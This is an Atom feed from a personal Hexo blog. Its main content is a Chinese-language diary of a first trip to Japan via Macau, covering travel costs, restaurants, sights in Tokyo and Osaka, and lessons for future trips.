<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-01-31T08:04:07.179Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第一次日本之行</title>
    <link href="http://example.com/2024/01/29/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E6%9C%AC%E4%B9%8B%E8%A1%8C/"/>
    <id>http://example.com/2024/01/29/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E6%9C%AC%E4%B9%8B%E8%A1%8C/</id>
    <published>2024-01-28T16:00:00.000Z</published>
    <updated>2024-01-31T08:04:07.179Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/japan_1.jpg" alt="Japan"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>日本之行结束了，嗖~如一阵烟便消失了。</p><h1 id="我的心情"><a href="#我的心情" class="headerlink" title="我的心情"></a>我的心情</h1><p>在出发前，原以为自己会在日本心情比较激动，毕竟久违地出国旅游还是自己看动漫比较多的日本，但实际没有。一小部分原因是我的脚每天都在痛（走多了），更大的原因是我的心波动越来越小了。能感受到自己对于活着的喜悦很少呢，但我想努力改变这种状况。尽管很多时候努力了还是不尽如人意。<br>不过我的心情还是比较愉快的。</p><h1 id="日本的消费"><a href="#日本的消费" class="headerlink" title="日本的消费"></a>日本的消费</h1><p><strong>去日本之前的准备花费</strong><br>护照：120元<br>日本签证：262+14(寄送资料)元<br>流量卡34元</p><p>人民币和日元汇率0.0486差不多。<br><strong>机票</strong><br>不算贵，感觉和飞国内差不多。2000人民币以内能买到往返机票。<br><strong>住宿</strong><br>游客的住宿，如果是酒店的话价格会比较高，通常400-500只能住房间面积很小的双人床，但是如果住民宿就很舒服了，通常300人民币就能住到宽敞的双人床房间，平均每人甚至都花不到180人民币一晚。与国内对比可以说完全不贵了。澳门住一晚没有500别想。<br><strong>用餐</strong><br>大致要分两种，一种是在餐厅消费，一种是在麦当劳便利店消费。<br>餐厅消费的话，东京普遍价格在40-300人民币之间。最便宜能吃饱的通常就是拉面店这一类餐厅，比较贵的就是烤肉了，想吃得畅快往往在500人民币左右（本次未吃太贵了）。<br>麦当劳便利店消费的话，通常就是预制菜一类。全国价格比较统一，一般在20-50人民币之间。<br>举例麦当劳的 汉堡+薯条+可乐 三件套在27-43人民币之间。对比一下国内的话其实价格差不多，当然如果国内在淘宝等地方买是会便宜一半左右。<br>不过如果按麦当劳app或小程序点餐，想想日本比国内高那么多的人工费最后价格却相差无几，那其实说明国内的利润不少。澳门麦当劳比日本还贵。<br>餐厅吃这一块儿，体感日本比国内二线城市贵了2.5-3倍，比国内一线城市贵了1-1.5倍<br>另外还得补充一点小吃，不同小吃价格还是相差蛮大的，比如草莓大福20元一个，和果子17元一个。又像章鱼烧，平均每个不到2元，也挺好吃的。还有可丽饼、冰淇淋一个20元左右。便利店的面包一个5-10元。<br><strong>饮料</strong><br>其实日本很多地方可以免费喝水，大部分时候看不到日本人会拿着塑料瓶。不过日本的纯净水大多是在5-8元之间，可口可乐500ML的有6块一罐也有9块一瓶。饮料价格普遍是国内的3倍左右。<br><strong>交通</strong><br>日本人用的最多的是地铁，一般来说坐一次8-20元，如果是从市区到机场之类的地方大概需要50-100元。公交车的价格差不多12元，如果是从东京市区到富士山河口湖要120元左右。出租车此次日本之行也没坐，听说200日元每公里。总的来说交通价格应该是国内的4倍。<br><strong>水果蔬菜肉类</strong><br>此次日本之行没有买，总的来说是比国内的贵一些，但有些东西的价格也没贵到离谱。和国内二线城市相比平均贵了2倍左右吧，水果要更贵一些。如果在日本生活自己做菜吃每顿成本应该不超过25元吧。<br><strong>演出</strong><br>在日本看各种展览，演出或演唱会等，价格一般在50-500元之间吧，感觉和国内没有差别多大(黄牛加价因素不考虑在内)。<br><strong>其它</strong><br>看到的按摩150元30min，感觉还不算贵(相较于东京一小时人工费最低55元而言)。</p><h1 id="去的日本景点与美食"><a href="#去的日本景点与美食" class="headerlink" title="去的日本景点与美食"></a>去的日本景点与美食</h1><p>这里记载的是本次日本之行去过的日本景点与美食。</p><h2 id="成都飞澳门"><a href="#成都飞澳门" class="headerlink" title="成都飞澳门"></a>成都飞澳门</h2><p>迟到比较普遍，本次是迟到了20min左右，看了以往数据也有迟到。<br>在这趟航班上空姐们穿的红色制服，使用语言主要为中文和英语。飞机起飞半小时后陆续开始飞机餐，顺便会发一瓶300ml的瓶装水。<br>飞机餐是两种选择，面或饭。<br>第一次我选择了面，味道还算将就。但是非常少，几下就吃完了，另外会发放一个面包和水果。<br>入境澳门海关时因为之前记得中转不需要澳门通行证，也就没办，去到窗口说明情况后，发了一张小纸，证明可以在澳门滞留7天。不过实际上没有任何人会看这个。</p><h2 id="澳门"><a href="#澳门" class="headerlink" title="澳门"></a>澳门</h2><p>澳门之旅毫无疑问是不愉快的。<br>机场暂存行李需要80人民币，对于我们刚下飞机还是大陆物价的人来说有点难以接受，毕竟我认为在大陆这个价格都可以找家旅馆住一晚了。<br>出机场的人几乎没有步行的。而我们选择了步行。<br>澳门天气即使在冬天也平均有20度左右，来澳门时未考虑到天气因素穿得太厚了，只得在路上偷偷摸摸脱了2件衣服。<br>走过了一片片没人的地方，终于能看到有人生活的气息了，但同伴想去的是海的另一边，我便只得跟着托着行李箱爬坡。<br>走了一会儿感觉渴了，正巧发现一瓶自动售卖机，买了一瓶可乐，6.25人民币（比日本可乐还贵）。<br>千辛万苦走到大桥，发现禁止行人通行。本想着退而求其次，至少坐出租车过去吧，发现又注册不了打车程序，小红书上又写出租车不接受微信支付宝。最终只得折返，先去了一家麦当劳吃晚餐。板烧鸡腿堡套餐42人民币。<br>同伴听信小红书的话跑去一个娱乐场存行李，没有成功。跑到一个所谓热闹的地方结果基本没人。<br>最终拖着行李四处逛，走了那么久发现几乎没人像我们一样，格格不入。<br>澳门的人使用三种语言，英语，葡萄牙语和澳门语。四处流浪，走到一个商场里，发现了一个娱乐场，本想进去瞅瞅，却被保安拦了下来。大概是我们拖着行李吧。最终我们在一个公园里待着，我不想考虑那么多，睡在椅子上，睡了一两小时被风吹得冷醒了。这时我才明白无家可归的人是种什么感受。</p><h2 id="澳门飞东京"><a href="#澳门飞东京" class="headerlink" title="澳门飞东京"></a>澳门飞东京</h2><p>和上一次相差不大，不过这次的飞机餐我选择了饭。因为是飞往日本的航班，所以在饭上面比较日式。但是很难吃。<br>中国人的数量比较多，也有回国的日本人。<br>下飞机后到了日本海关，需要填一个Visit Japan的黄色单子信息(有中文)，关键信息填好即可，其它不知道的比如房东号码随便填，不会仔细看。<br>拿取行李后，还需要填一个黄色的单子(有中文)。也是和之前填的按相同做法，最后到检查口会需要检查护照。如果会日语就能很轻松通过。</p><h2 id="麦当劳"><a href="#麦当劳" class="headerlink" title="麦当劳"></a>麦当劳</h2><p>麦当劳巨无霸套餐780日元。足够吃饱了，味道不算差。唯一有一点是薯条默认没有任何调味料，没有番茄酱呢。</p><h2 id="六本木新城-amp-东京塔"><a href="#六本木新城-amp-东京塔" class="headerlink" title="六本木新城&amp;东京塔"></a>六本木新城&amp;东京塔</h2><p>到六本木新城的时候已经接近晚上10点了，所以也几乎打烊。于是楼虽高终也未登高。我们沿着路往东京塔的方向靠近，夜晚的东京塔也算是一道美景。沿途拍了几张作为记录。<br><img src="/images/Japan_2.jpg" alt="东京塔"></p><h2 id="天妇罗"><a href="#天妇罗" class="headerlink" title="天妇罗"></a>天妇罗</h2><p>天吉屋 新宿店<br>点了店里1650日元的天妇罗招牌套餐，很美味。而且不会感觉腻。米饭虽然只有一小桶，但能看到晶莹剔透，绝不是拿的次等米。<br><img src="/images/Japan_13.jpg" alt="天妇罗"></p><h2 id="明治神宫"><a href="#明治神宫" class="headerlink" title="明治神宫"></a>明治神宫</h2><p>跟着Google Maps的导航走，进了后门，人很稀少，周围有许多百年大树，跟着前面2个日本人不一会儿走到了神宫内，顿时就热闹非凡了。有各个地区的学生练的巨大书法在墙上贴着。有500日元祈福的“绘马”，有人在丢硬币做参拜。因为我们是从出口走到入口，所以看的景色也和大多数人有所区别，像是入门的洗手洗嘴，有些日本人在大门前会有拜的动作。回程时看到一些小学生穿短裤光着腿不禁感叹他们的抗寒能力。<br>出门吃了个冰淇淋，英文名是Special Green Tea，听说是京都特产，500日元一个。味道还不错。</p><h2 id="新宿"><a href="#新宿" class="headerlink" title="新宿"></a>新宿</h2><p>因为出明治神宫时还比较早，步行到新宿继续逛。路上能感觉到空气的清新，吸烟的人只能在吸烟区，东京这样的大城市还是比较守规范的。走日本的小巷其实没什么人，但也很干净。<br>步行了大约50分钟，到了歌舞伎町。此时就能看到很多“无料案内”了，还有很多官方的警示牌，大意是禁止强制拉客吧。逛了2小时左右，给人的氛围还是不错的，歌舞伎町蛮热闹的。</p><h2 id="涉谷"><a href="#涉谷" class="headerlink" title="涉谷"></a>涉谷</h2><p>涉谷一下车站，就能走到十字路口，每次红灯过后都有数百人经过，很多人拿着相机拍摄。不过我没留下一张照片。逛涉谷就没看到新宿那种风俗店了，取而代之的是一些按摩店。人潮汹涌，到了9点后也不再火热。</p><h2 id="拉面"><a href="#拉面" class="headerlink" title="拉面"></a>拉面</h2><p>吃的拉面，由于是游客想尝尝最好的是什么样的，于是点了偏贵的1100日元的拉面。在店门口发现了自动售卖拉面券的机器，我们正在选时拉面店老板出门查看我们人数，等我们买好后进门已经有冰水摆在桌上了。于是老板开始询问面的详细配置，诸如量的多少，硬度，pork还是chicken等。由于日式英语有点没反应过来，选的时候有点懵就结束了。<br>由于进门时我们是第一组客人，不一会儿拉面就上桌了。拉面分了2个碗，其一装拉面，其二装底料。等上齐之后，我和同伴发现，明明点的是同一个，但由于配置不同，看起来相差还是比较大的。<br>拉面老板十分热情，有空的时候会把客人送至门口，即使没空也会说好多声“谢谢”之类的话。</p><h2 id="富士山"><a href="#富士山" class="headerlink" title="富士山"></a>富士山</h2><p>老实说，这次富士山玩得不算多好，因为诸多不熟悉的因素导致了一系列差错。尽管选的日子是大晴天，却仍有一团白云笼罩在富士山头顶。不过风景也不算太差就是了。去坐了富士山天上山缆车的下车路，花了500日元。一开始我还以为这个是至少在空中观赏20分钟的有趣项目，结果仅仅是2分钟下山的代步项目。<br>去了山中湖发现马上要到回东京市区的公交车发车时间，又一路狂奔到车站（这件事详情会单独写出来）。</p><h2 id="日式西餐厅"><a href="#日式西餐厅" class="headerlink" title="日式西餐厅"></a>日式西餐厅</h2><p>由于之前决定的2家餐厅都莫名其妙的没开门，于是我们只好临时搜索了一家高评分的日式西餐厅。和之前的餐厅老板一样都很热情，简直像是对待几年没回家的家人似的。餐厅主要就3种，但是第一种会有很多搭配，由于时间不多我们便三下五除二做出了选择。<br>于是汤，面包，意面一个个端上来了(印象中只有这3个，不知道忘了没)。味道还算不错的，老板也很热情，问我们来自哪里，不巧China她只知道北京上海。</p><h2 id="咖喱"><a href="#咖喱" class="headerlink" title="咖喱"></a>咖喱</h2><p>回到东京市区后，按计划我们马不停蹄地去了下北泽吃咖喱，在之前计划里其中一家已打烊，只得选择第二家。这一家的餐厅很小，约莫能容纳8,9人。看着不明不白的菜单，稀里糊涂的又选完了。端上来的咖喱饭，很有特色。有三种肉：鸡肉，猪肉，牛肉。另外我们还点了一小碗羊肉。加入佐料混合在一起吃，味道有些奇特，我唯一感觉可惜的是饭太少了，混合在一起时几乎感受不到饭的味道，让我口腔里只剩下各种肉类和调味料。</p><h2 id="下北泽"><a href="#下北泽" class="headerlink" title="下北泽"></a>下北泽</h2><p>来到下北泽，就是著名的孤独摇滚圣地巡礼了，不过别人大多是白天来，而我们无奈晚上才来。随便逛了逛，这里与大热门的新宿涉谷又是另一番风味。怎么说呢？它没有新宿涉谷那么热闹那么地接受外来游客，只是静静地在那里不声不响，孤独却不寂寞。</p><h2 id="筑地市场"><a href="#筑地市场" class="headerlink" title="筑地市场"></a>筑地市场</h2><p>很遗憾，没有起个大早，到了筑地时已经快到11点了，而我又正好吃了早餐，于是遇上了看着就很美味的草莓屁屁大福只能吃一个，不过价格感觉还是蛮贵的，400日元一个。完全值得的美味，草莓的香甜汁液与点心皮和点心馅儿混合一起，一瞬间一切都消失了，只剩下人间至福。<br>感觉筑地市场只有那些需要排队的才好吃，不用排队的都比较一般吧。问题在于排队的多半都要等不少时间，这是比较可惜的。<br>去吃午餐路上还发现了一个筑地本愿寺，去的人大多是为了参拜或仅仅是游客。寺庙本身还算大，但正中间都不允许进入，只有边缘可以走，这样一来就显得很小了。<br><img src="/images/Japan_5.jpg" alt="草莓屁屁大福"></p><h2 id="寿司"><a href="#寿司" class="headerlink" title="寿司"></a>寿司</h2><p>去吃了筑地旁的寿司，要登记名字，前面大约15人，等了45分钟。真久啊。进去后是站着吃的，俗称罚站hh。我点了最贵的1990日元的10贯寿司，是师傅手捏好然后一个个拿来的。酱油和芥末是一起的，当把表面的酱油蘸完，底部就是芥末了。能感受到那些鱼的晶莹剔透以及咬下去的那种入口即化的感受。简直令人欲罢不能。只吃了10贯没一会儿就出来了。当时以为吃饱了，其实可能只是站着造成的错觉吧，下午很快就饿了。</p><h2 id="teamLab-Planets"><a href="#teamLab-Planets" class="headerlink" title="teamLab Planets"></a>teamLab Planets</h2><p>下午去看了这个展，我不知道这个展是哪个国家的人做的，好像只在亚洲这边有，但是又好像工作人员大多西方人或说英语。令我摸不着头脑，但是挺不错的。<br>展览总共有6个：</p><ol><li>五彩晶莹垂落的光条与四面八方的反射镜，仿若是置身于梦幻之境。</li><li>浮现于水域的鲤鱼四处游动，彩色漩涡令人惊叹。</li><li>巨大气球，随时间不断改变颜色</li><li>好像是在旋转的巨大轮盘，天幕上是投影的四处飘散的花朵。我们在这儿躺了足足半小时有余。</li><li>巨大的银色蛋形物质，好像是要晚上才会显现光芒。</li><li>数十种花朵一齐展现在面前，能闻到淡淡的花香。</li></ol><h2 id="银座"><a href="#银座" class="headerlink" title="银座"></a>银座</h2><p>购物之地，下午来的时候感觉人不算多。这里又是另一种气息，仿佛是一位高贵而冷艳的矜持女子，很难说在这儿感受到多么的热情，透露出的是一股冷冷的气息。</p><h2 id="猪排饭"><a href="#猪排饭" class="headerlink" title="猪排饭"></a>猪排饭</h2><p>选择了一家猪排饭，不错的评价让人选择了它。来的时候刚刚好开门，来的人仿佛都是常客了，清一色点的1650日元的猪排饭，而我们点的1950日元(因为旅游想尝尝最好的什么样)。结果发现其中的区别就是有无咖喱。早知道还不如点普通猪排饭。<br>桌上有五六种酱，我想每种都轮流加，这样吃起来不会感觉单调。</p><h2 id="浅草rocksta表演"><a href="#浅草rocksta表演" class="headerlink" title="浅草rocksta表演"></a>浅草rocksta表演</h2><p>来浅草时街上的店大多关门了，由于需要等待最后一场演出，先在外面超市买了一点纪念品。<br>终于等到了，我们每人花了4000日元观看演出，现场不准使用手机，被俩老头严厉地说了。坐第二排观看演出。<br>表演流程大致是：先在场上一起做常规表演，然后一个人走到T台的前端开始褪去身上服装摆出各种姿势，底部的圆盘会自动转圈。<br>一共有7场。第4场的女生很有活力，令人比较有印象。还有一位在最开始热身表演就担任主角的乖巧女生让我比较喜欢。其它就比较单调了，我一开始期待的是那种犹抱琵琶半遮面的羞涩感，但看来并没有如此。<br>来的人把座位都占满了，还有不少站着观赏的。有不少外国人，也有不少女生。<br><img src="/images/Japan_7.jpg" alt="主演们"></p><h2 id="汉堡肉和布丁"><a href="#汉堡肉和布丁" class="headerlink" title="汉堡肉和布丁"></a>汉堡肉和布丁</h2><p>就近原则，选了一家看起来评分还不错的。主打蛋包饭。<br>进门后，是一间安静的吧台样式的餐厅。桌上已摆好了菜单，我看着上面是英文，下面是日文。估摸着下面也看不懂直接看上面，然后我把它理解成了套餐。点完后自以为点了很多，结果只是一份1000日元的蛋包饭和一份1000日元的汉堡牛排+600日元的南瓜布丁。起先上的是蛋包饭我让给了邻座同伴，因为我以为我既点了蛋包饭又点了汉堡牛排。结果就是最后并没有吃到期待中的蛋包饭。</p><h2 id="浅草寺"><a href="#浅草寺" class="headerlink" title="浅草寺"></a>浅草寺</h2><p>由于之前住民宿时临时想在东京多留一天，但发现原来定下的民宿的后一天已经被人定了，于是早上先跑到新的民宿去，然后再去的浅草寺。<br>去浅草寺那天是阴雨朦胧，而我们走的路的顺序按地图直达浅草寺，所以也错过了浅草寺的雷门。走在中间的小巷里，两边都开着店铺，即使阴雨天也能看到人来人往。<br>此时发现了和果子，看起来也挺美味的样子，350日元一串，买了3串。好吃！能感受到糯米的香味与淡淡的甜味，一口咬下去便黏在了牙齿间，仿似依依不舍。<br>很快就走到浅草寺了，门前雨伞林立，进入了大门，有许多人排队参拜，左右都有卖祈福的福袋，也有著名的抽签。不过我一样都没做，毕竟我并不信这些。待了一会儿，走到雷门，雷门十分大。门前有一位身着黑色和服的女生，以羽扇掩面无言，因为我看到有穿黑衣的工作人员，而且这位女生容貌精致让人难以忘怀，所以我一时间误以为这位女生是官方请来专门让游客拍照的。尽管觉得有些奇怪，还是接受了。<br>去周围的纪念品店逛了逛，并没有看到什么有趣的东西。老实说，我觉得纪念品大多并不值得买，虽则只有在日本能买，可问题是买纪念品大多收割的不过是游客的一时兴致，买回去后能记得还能多久呢？甚至不如花瓶做装饰用。另外，如果此生只来日本一次，我觉得买纪念品倒也无可厚非，但我自己并不觉得此生只来一次，很可能以后还会来很多次，这是一块有趣的地方。基于这三个原因，我什么也没买。<br>后来再到雷门等人，才发现雷门的那位女生也不过是在等人罢了。在这之前也有很多位游客如我一般将她当作了一道风景咔咔拍照。不禁哑然失笑了。<br><img src="/images/Japan_8.jpg" alt="雷门"></p><h2 id="东京国立博物馆"><a href="#东京国立博物馆" class="headerlink" title="东京国立博物馆"></a>东京国立博物馆</h2><p>不了解的，去看只能了解；了解的，去看才叫欣赏。</p><p>1000日元的门票，2100日元是特别展，不过没买特别展，关于佛教的也不懂，还有点小贵呢。<br>进去之后，能感受到内容特别多。有两层楼，我们进门后以顺时针方向浏览。<br>到写下本文时我已经忘了很多文物的样貌了。不过左边进门处是卖纪念品的。看了一圈价格还算偏贵，也没有特别喜欢的。<br>再继续走，就是集邮的了。随便盖了几个印，老实说没感觉有什么。<br>继续走啊走，看了各种各样的文物，不过仅仅是看文物的样子也无法得知它的时代背景，又看了标注的背景介绍。便渐渐地有所感受了。<br>有很多石器时代的东西，在本身就足够古老的前提下支离破碎的，我感觉没什么拿出来展览的必要。<br>给我印象最深的是一把剑，因为看的时候剑展览的位置没有灯光，所以远远看不出什么，但当走近看时能发现漆黑的剑身上有着五彩琉璃，着实令我惊艳。可惜的是我没把它拍下来。<br>随后也看了很多各式各样的文物，诸如武士刀，铠甲，皇袍，字画，佛像等等。看到中意的有很多不允许拍照，也是可惜。<br>因为腿蛮痛的，看一会儿我就休息一会儿，可能多花了一些时间吧。</p><h2 id="鳗鱼饭"><a href="#鳗鱼饭" class="headerlink" title="鳗鱼饭"></a>鳗鱼饭</h2><p>从东京国立博物馆出门后，便发现不远处有人在表演，虽然雨淅淅沥沥在下，人也有不少，气氛还挺热闹。想着既然不花钱就去看看吧，不过走进了看发现好像都是男生假扮的女生，而且歌也不是现场唱的，于是没看多久便离开了。<br>原本是打算先回民宿把行李箱放在房间里（之前去时还没退房，东西都在外面），但走了几步路计算了一下时间发现这样太晚了，于是决定直接去秋叶原吃晚餐。<br>由于发现坐电车和走路花费时间差不多，就径直往秋叶原走了。许久之后终于抵达，鳗鱼饭是在门口用自动售票机卖的，种类无非就是特大大中小和加些配菜之类的。我选的“上”，花了1580日元。点了后直接进门，也是个小店，仅坐了十号人左右。<br>少顷鳗鱼饭便送到了，蛮好吃的，口中会有一股淡淡的海的味道。而鳗鱼本身的刺令人忽略不计。再与洁白的米饭组合一起，是能让人吃三大碗的程度。</p><h2 id="秋叶原"><a href="#秋叶原" class="headerlink" title="秋叶原"></a>秋叶原</h2><p>饭毕后，已经接近晚上八点了。体感上一半的店都关门了，只得搜寻地图四处逛逛。<br><img src="/images/Japan_10.jpg" alt="秋叶原"><br>此时还在开着的店，好多都有卖成人用品。琳琅满目迷人眼，不过感觉也就那几类吧。在狭小的通行中没怎么感受到乐趣。<br>在外面走时和网上说的一样，有很多女生站在街边，样貌和身材似乎都还不错，但我不想多看，免得她们以为我有兴趣拉着我。<br>这便是东京的最后一天逛的地点了。</p><h2 id="东京飞大阪"><a href="#东京飞大阪" class="headerlink" title="东京飞大阪"></a>东京飞大阪</h2><p>早上六点便起床，准备去成田乘8:30的飞机前往大阪。<br>去机场的车票挺贵的，大概总共花了2500日元。然后到了机场自助打印登机牌。一路前去安检，稍微惊讶的一点安检是还需要脱鞋，虽然也有人没脱鞋就去了但我还是想尽量遵守规则。<br>一切顺利，距离起飞还有20min，坐上大巴，登机时就只有10min起飞了。可谓是踩点之行。</p><h2 id="居酒屋"><a href="#居酒屋" class="headerlink" title="居酒屋"></a>居酒屋</h2><p>在大阪下飞机坐电车放行李一通操作后，终于去吃午餐了。由于很多店关门了，我们只得选择了一家居酒屋。进门后店主便问我们是否抽烟，我一开始没有意识到这有什么区别，便想往无需脱鞋的地方坐下。但店主接着示意我才明白，不脱鞋的地方是抽烟的人坐的。我们被安排在了最里侧的小桌上。菜单是在平板上，自己点。我们点了牡蛎和一个看起来是面的东西。还没点完，店员小姐便送上来了一碗肉菜，一开始以为是送的，后来核对账单时才发现是算在了账单里的，相当于变相收取座位费了。<br>菜一个个送上来了，牡蛎只有8个，是用清水煮的。店员小姐看时机便把煮好的牡蛎给打开送入碗中，这便是1100日元的菜了，感觉有点小贵。然后点的以为是面的菜送上桌了，发现并不是面，而是与白菜一起炒的什么肉。不难吃，加上我也蛮饿，便几下子吃完了。最后结账单时挺贵的，算是日本之行最贵的一顿了。</p><h2 id="章鱼烧"><a href="#章鱼烧" class="headerlink" title="章鱼烧"></a>章鱼烧</h2><p>往这边吃午餐的其中一个目的便是为了章鱼烧，因为想尝尝大阪美味的特产。<br>不过一开始是走到一家可丽饼店门前想尝尝可丽饼，但苦恼于没有坐的地方可以吃便放弃了。<br>最终走到了章鱼烧店门前，看着招牌写着“全国6790家章鱼烧里排名第3名”，也不禁让我想知道到底有多好吃了。<br>门前排着长队，等了约半小时终于轮到我了，300日元8个。买了后就往右边的公园去找座位吃。<br>味道还是挺不错的，但有个问题是必须要第一时间吃才是最佳。我走到公园还是花了些时间，结果吃的时候感觉已经像是要化掉那般松软了。</p><h2 id="通天阁"><a href="#通天阁" class="headerlink" title="通天阁"></a>通天阁</h2><p>由于耽误了不少时间，便没去住吉大社而是直接前往通天阁了。<br>通天阁看着还行，想着来日本也没登上过什么高地，便登上去了。<br>买票排队的时候没注意，不小心选了滑梯+通天阁顶层的项目。多花了700日元。<br>而滑梯处的两位工作人员十分热情，会说“你好”之类的。令我稍微有点尴尬，毕竟不是想来而是误选。<br>滑梯过程还是很短的，体感上不超1min。</p><p>去了通天阁二层，基本都是卖纪念品纪念照之类的，然后还有讲述什么筋肉人的漫画等，没有太大兴趣。<br>很快便去了四层，四层算是顶层以外最高的一层了，能看到下方街道的市井繁华。没多少犹豫，既然买了顶层票便登上了顶层。顺带一提，顶层票300日元。顶层没有加盖，周围只有铁丝网覆盖。虽有风袭来，也并不冷。拍了些照便找地方坐下了，能看到周围还有几座比通天阁更高的大楼，只可惜时间有限去不了了。</p><h2 id="便利店"><a href="#便利店" class="headerlink" title="便利店"></a>便利店</h2><p>由于吃穷了没现金，晚餐就在便利店解决了。<br>即使如此还是花了679日元。买了一瓶同伴推荐的奶，和一份大阪烧。味道不算难吃，但也完全称不上好吃。</p><h2 id="道顿堀"><a href="#道顿堀" class="headerlink" title="道顿堀"></a>道顿堀</h2><p>出门时已是10点，去了道顿堀附近转悠。周围还是蛮热闹的，先是发现了一个很大的扭蛋馆。林林总总估计有数百个，同伴有想要的东西没在这家店找到，又去了另一家店，不过我觉得肯定早就没了，因为他是在小红书上看到的，网红产品总是令人蜂拥而上。扭蛋还是蛮有趣的，也许我没关注，总觉得扭扭蛋的人并不多，大部分都是看看而已。<br>至于我自己，也实在没有发现令我感兴趣的东西。有时会觉得自己是否太苛刻了呢，或许不那么感兴趣的东西也可以抽一抽。不过最终还是什么都没抽就离开了，因为扭蛋只接受现金，不巧现金用得七七八八了。</p><p>后面走着便发现了一个著名的网红打卡地。尽管我不是那么感兴趣，还是拍了几张照。<br>但走时发现的另一处地点拍照感觉蛮不错的，便拍了下来，湖水荡漾倒映着摩天轮。<br><img src="/images/japan_1.jpg" alt="道顿堀"></p><h2 id="麦当劳-1"><a href="#麦当劳-1" class="headerlink" title="麦当劳"></a>麦当劳</h2><p>午餐在麦当劳解决了，吃的只有日本才有的月白汉堡(我不知道准确叫什么名，自己起的)。味道还不错，中间的实际上就是煎鸡蛋，不过时机恰到好处，因为鸡蛋外面和里面一样嫩，也不会感到腻味。吃完后自己收了盘子，感觉自己很有素质hhh</p><h2 id="大阪飞成都"><a href="#大阪飞成都" class="headerlink" title="大阪飞成都"></a>大阪飞成都</h2><p>提前75m停止值机，我是在停止值机的前15m开始办值机手续的。虽然可以在四川航空官网办理自助值机，但是需要用手机号登录，而且填写护照截止有效日期最多到2030年，对于超过2030年的我无法值机。<br>本次航班比较准时，按时程表上起飞前40m就开始登机了。但由于流量限制还是迟了10m才开始上跑道。<br>飞机比较大，装了380个人左右。座位是三人一组，座位上放了红色毛毯大概用来盖腿，但由于我不觉得冷，就直接坐下了。<br>起飞后半小时左右，开始用纸杯发放饮料，可选内容很多，据我所见：百事可乐，7喜，橙汁，咖啡，纯水，红酒(应是头等舱可选)等等。<br>随后便开始发放飞机餐。可选臊子面或宫保鸡丁混合回锅肉饭。<br>我第一次选择了面，然后发放了一个小盒子，有50ml酸奶，小个包装面包和小包榨菜，后面还发放了一个热面包。<br>由于我完全没吃饱，第二次又向空姐要了一份饭。饭实在太难吃了。只得向乘务人员再要来点辣酱中和一下味道。<br>随后的时间里，乘务人员大概每过40m，不断来询问是否需要饮料。最后免费送了瓶水(品牌是冰川时代)。<br>总的来说食物饮料还是比较丰盛的。<br>乘务人员大部分用的是中文，感觉英语稍有逊色，不过不影响交流。航班上大部分也是中国人。<br>飞机上一直水耳不均，靠吞咽来维持。不知为什么以前坐飞机都不会，现在却变成这样了。</p><h1 id="改进之处"><a href="#改进之处" class="headerlink" title="改进之处"></a>改进之处</h1><p>写了很多，花了很多时间，不过若是想到以后的旅游，我想恐怕还是值得的。<br>虽然花了不少时间做攻略，但真正落到实际出行时，还是会产生许许多多不尽如人意之处。于是就有了需要改进的地方。</p><h2 id="只玩一个城市"><a href="#只玩一个城市" class="headerlink" title="只玩一个城市"></a>只玩一个城市</h2><p>在国外旅行时，我认为如果只有一周时间内，那么只玩一个城市。只有两种情况可以作为例外：一种是城市太小，没什么值得游玩的；另一种是只想去知名景点走马观花式地游玩。<br>本次旅行最初计划了东京和大阪，但随后发现其实东京或大阪单独一个城市已经很丰富了，任意一个都可以玩7天以上。<br>最后发现由于要去大阪，不得不多花掉550人民币左右的机票和电车票钱。还浪费了至少8小时的时间。</p><h2 id="少玩社交软件"><a href="#少玩社交软件" class="headerlink" title="少玩社交软件"></a>少玩社交软件</h2><p>每次回到旅馆，躺在床上就想刷手机，这7天起码浪费了10个小时。如果不刷手机，而是把时间拿去睡眠，这样每天就能在7,8点出门而不是10点才出门了。</p><h2 id="时间放宽裕"><a href="#时间放宽裕" class="headerlink" title="时间放宽裕"></a>时间放宽裕</h2><p>由于在国外旅行，即使做了计划很多时候还是会有超出计划外的情况。<br>比如会坐错站，坐过站，方向坐反，站没错但车坐错了，什么搞错了，本来想去的餐厅没开门等等。<br>就是因为总总原因，造成我们的富士山之旅非常紧迫，想要感受的风景却没感受到，十分遗憾。</p><h2 id="旅游前锻炼好体力"><a href="#旅游前锻炼好体力" class="headerlink" title="旅游前锻炼好体力"></a>旅游前锻炼好体力</h2><p>旅游和度假是两个概念，旅游就是要到处逛，累人是必然的。度假是在少数一个或几个地方待着，放松身心。<br>在旅游前我的体力没怎么锻炼，结果造成我的脚第一天就开始“抱怨”了，脚开始疼，膝盖会有磨损的感觉，每走一会儿就想休息等等。<br>这也让本次旅游我全程是在痛苦中前行的，还浪费了少许时间。脚要是不痛的话，有时就可以跑步前行了。</p><h2 id="带够现金"><a href="#带够现金" class="headerlink" title="带够现金"></a>带够现金</h2><p>现金是唯一全场景支持的。没有现金很多店就无法入门了。</p><h1 id="总的感受"><a href="#总的感受" class="headerlink" title="总的感受"></a>总的感受</h1><p>日本是一个旅游的好地方！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/japan_1.jpg&quot; alt=&quot;Japan&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>24年开篇生活随想</title>
    <link href="http://example.com/2024/01/12/24%E5%B9%B4%E5%BC%80%E7%AF%87%E7%94%9F%E6%B4%BB%E9%9A%8F%E6%83%B3/"/>
    <id>http://example.com/2024/01/12/24%E5%B9%B4%E5%BC%80%E7%AF%87%E7%94%9F%E6%B4%BB%E9%9A%8F%E6%83%B3/</id>
    <published>2024-01-11T16:00:00.000Z</published>
    <updated>2024-01-12T16:17:53.565Z</updated>
    
